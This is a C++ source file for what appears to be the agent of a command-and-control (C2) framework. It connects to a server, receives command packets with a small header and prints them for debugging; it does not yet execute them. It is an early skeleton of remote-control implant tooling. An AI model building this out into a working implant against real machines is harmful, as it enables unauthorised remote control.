#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdlib>
#include <print>
#include "packet.hpp"
#include "agent.hpp"
#include "common.hpp"
// #include <openssl/ssl.h> // using openssl to encrypt the open socket communication
// #include <openssl/err.h>

void common::code_exit(){
    std::cout << "[*]Corrupted data exiting program...." << std::endl;
    exit(EXIT_FAILURE);
}


// void common::receive_failed(int connection_status){
//     if(connection_status < 0){
//         std::perror( "[*]connection failed to establish between c2 server and agent");
//         std::cout << std::endl;
//         return;
//     }
// }


void common::socket_check(int soc_fd){
    if(soc_fd < 0){
        std::perror("[*]socket creation failed");
        std::cout << std::endl;
        exit(EXIT_FAILURE);
    }
}


void common::connection_failed(int connection_status){
    if(connection_status == 0){
        std::perror("[-]server disconnected connection");
        std::cout << std::endl;
        exit(EXIT_FAILURE);
    }
    else{
        std::perror("[-]receive failed");
        std::cout << std::endl;
    }
}


void common::inet_ntop_failed(int client_fd){
    std::perror("[!]failed to convert agent ip address to human readable string");
    std::cout << std::endl;
    close(client_fd);
}


bool agent::recv_all(int client_fd, void *buffer, size_t length){
    size_t total_bytes_received = 0;
    while(total_bytes_received < length){
        ssize_t bytes_received = recv(client_fd, static_cast<char *>(buffer) + total_bytes_received, length - total_bytes_received, 0);
        if(bytes_received <= 0)
            return false;
        total_bytes_received = total_bytes_received + bytes_received;
    }
    return true;
}
// void display_command_output(uint32_t command_length, uint32_t session_id, uint8_t heartbeat, std::string command){
//     packet p1;
//     p1.command_length = command_length;
//     p1.session_id = session_id;
//     p1.heartbeat = heartbeat + 1; //indicating agent is online
//     p1.command = command;
//     //std::cout << "$$$$$$$ Payload Details $$$$$$$" << std::endl;
//     std::println("{:<20}{:<20}{:<20}{:<20}", "Session_ID", "Hearbeat", "Command_Length", "Command");
//     std::println("{:<20}{:<20}{:<20}{:<20}", p1.session_id, p1.heartbeat, p1.command_length, p1.command);
//     std::println();
// }    


packet deserialization_payload_header(const uint8_t payload_header[]){ // convert the raw bytes of payload header and store the actual data into a structure variable
/*
+-------------+-------------+-------------+----------------+
| Message Type|  Session ID | Payload Len |    Payload     |
|   4 bytes   |   4 bytes   |   4 bytes   | variable size  |
+-------------+-------------+-------------+----------------+
*/
    packet p1{}; // initializing the struct values to 0
    uint32_t message_type;
    uint32_t session_id;
    uint32_t payload_length;

    // reading message_type
    std::memcpy(
        &message_type,
        payload_header,
        sizeof(message_type)
    );
    // increment pointer to read correct data based on the value we need to store
    payload_header += sizeof(message_type);
    // reading session_id
    std::memcpy(
        &session_id,
        payload_header,
        sizeof(session_id)
    );
    payload_header += sizeof(session_id);
    // reading payload_length
    std::memcpy(
        &payload_length,
        payload_header,
        sizeof(payload_length)
    );
    // converting the data from network byte order to little endian byte order
    p1.message_type = ntohl(message_type);
    p1.session_id = ntohl(session_id);
    p1.payload_length = ntohl(payload_length);
    return p1;
}



std::string deserialization_payload(const uint8_t* payload, size_t payload_size){ // convert the raw bytes of payload command to human readable command and return the command
    return std::string(reinterpret_cast<const char *>(payload), payload_size);
}


bool agent::validate_ipaddress(std::string server_ip){
/*    
- Split the string by the dot (.) character.
- Count the parts to make sure there are exactly four pieces.
- Check each part to ensure it contains only digits.
- Convert each part to an integer and check if it is between 0 and 255.
- Check for leading zeros (like 01 or 007), which are usually invalid in standard IPv4 addresses.
*/
    std::cout << "[*] validating ip address of server..." << std::endl;
    std::vector<std::string> split_ip;
    std::stringstream test_ip(server_ip);
    std::string ip_part;
    while(std::getline(test_ip, ip_part, '.')){ // spling the ip address based on the dots(.)
        split_ip.push_back(ip_part);
    }
    if(split_ip.size() != 4) // count how many parts (total 4 should be there for IPV4 address)
        return false;
    for(const std::string& parts: split_ip){ // iterate through the ip parts and check whether integer or not
        if(parts.empty())return false; // edge cases where input could be for eg:- 192..28..1.0
        if(parts.length() > 1 && parts[0] == '0')return false; // check for leading zeroes
        for(char part : parts){ // parts contains each element from the spli_ip list and part takes one character from the entire string like for example from "192" part takes '1' so isdigit only takes positive elements from 0-9 so char is signed henced making it unsigned is necessary using static_cast 
            if(!std::isdigit(static_cast<unsigned char>(part)))
                return false;
        }
        int num = std::atoi(parts.c_str()); // convert the "192" part of the string to decimal and store in num
        if(num < 0 || num > 255)
            return false;
    }
    std::cout << "[+] server ip address validated" << std::endl;
    return true;
}


void agent::receive_commands(std::string SERVER_IP){
    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET; // IPv4 address
    if(inet_pton(AF_INET, SERVER_IP.c_str(), &server_address.sin_addr) <= 0){ // convert IP_address string to raw binary data in network byte order
        std::cout << "[!]invalid server IP" << std::endl;
        return;
    }
    server_address.sin_port = htons(AGENT_PORT); // port 1234 assigned
    //char server_response[100];
    // payload header storage
    // we using &byte_array 
    // although might seem byte_array would work cuz array is a pointer. but byte_array is vector object first so we need point to that vector object's address
    constexpr size_t HEADER_SIZE = 12;
    while(true){
        int client_fd = socket(AF_INET, SOCK_STREAM, 0);
        common::socket_check(client_fd);
        if(connect(client_fd, (struct sockaddr*)&server_address, sizeof(server_address)) == 0){
            std::cout << "[+]connected to server" << std::endl;
            while(true){
                uint8_t payload_header[HEADER_SIZE];
                if(!recv_all(client_fd, payload_header, HEADER_SIZE)){
                    std::cout << "[!]failed to receive packet header" << std::endl;
                    close(client_fd);
                    return;
                }
                packet received_packet = deserialization_payload_header(payload_header);
                
                // FOR DEBUGGING PURPOSE ONLY
                std::cout << "[+]MESSAGE_TYPE : " << received_packet.message_type << std::endl;
                std::cout << "[+]SESSION_ID : " << received_packet.session_id << std::endl;
                std::cout << "[+]PAYLOAD_LENGTH : " << received_packet.payload_length << std::endl;

                // getting the payload using the payload length
                if(received_packet.payload_length > 0){
                    std::vector<uint8_t> payload(received_packet.payload_length);
                    if(!recv_all(client_fd, payload.data(), payload.size())){
                        std::cout << "[!]failed to receive payload" << std::endl; // if failed to receive bytes, inner loop is exited and connection is retried from outer loop by creating a new socket
                        close(client_fd);
                        break; // when breaks new socket is created and connection is retried
                    }
                    received_packet.payload = deserialization_payload(payload.data(), payload.size()); //a vector_array's.size() sends const <datatype>* pointer or address
                    std::cout << "[+]PAYLOAD : " << received_packet.payload << std::endl;
                }
                // THE ABOVE SECTION DEBUGGING PURPOSE ONLY
            }
            std::cout << "[*]attempting to reconnect..." << std::endl; // if payload receiving fails then connection is retried
        }
        else{
            close(client_fd);
            std::cout << "[!]agent couldn't connect to server" << std::endl;
            break;
        }
    }
}

